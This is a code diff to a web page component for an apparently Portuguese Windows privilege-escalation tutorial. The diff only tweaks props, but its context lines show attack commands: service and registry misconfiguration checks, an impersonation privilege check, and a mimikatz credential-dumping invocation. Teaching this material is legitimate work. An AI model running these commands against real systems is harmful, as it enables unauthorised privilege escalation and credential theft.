@@ -11,16 +11,14 @@ export default function PrivescWindows() {
     <PageContainer
       title="PrivEsc — Escalação de privilégio (Windows)"
       subtitle="De usuário comum (ou serviço) para SYSTEM/Administrator: tokens, services, registry, AlwaysInstallElevated."
-      difficulty="intermediário"
+      difficulty="intermediario"
       timeToRead="22 min"
-      prompt="post/privesc-windows"
     >
       <h2>Recon obrigatório</h2>
       <Terminal
         user="user"
         host="WIN-TARGET"
         path="C:\\Users\\user"
-        prompt=">"
         lines={[
           {
             cmd: "whoami /all",
@@ -64,7 +62,6 @@ System Type:               x64-based PC`,
         user="user"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             comment: "do atacante: webserver",
@@ -114,7 +111,6 @@ System Type:               x64-based PC`,
         user="iis_user"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             cmd: "whoami /priv | findstr Impersonate",
@@ -159,7 +155,6 @@ nt authority\\system`,
         user="user"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             comment: "listar serviços que VOCÊ pode modificar",
@@ -212,7 +207,6 @@ Local Group Memberships      *Administrators       *Users`,
         user="user"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             cmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\\\windows\\\\\\\\\" | findstr /i /v \\\"\\\"\\\"",
@@ -245,7 +239,6 @@ Local Group Memberships      *Administrators       *Users`,
         user="user"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             cmd: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
@@ -279,7 +272,6 @@ HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
         user="admin"
         host="WIN-TARGET"
         path="C:\\Temp"
-        prompt=">"
         lines={[
           {
             cmd: ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
@@ -315,7 +307,6 @@ SID               : S-1-5-21-1234567890-987654321-1122334455-500
         user="user"
         host="WIN-TARGET"
         path="C:\\Users\\user"
-        prompt=">"
         lines={[
           {
             cmd: "cmdkey /list",
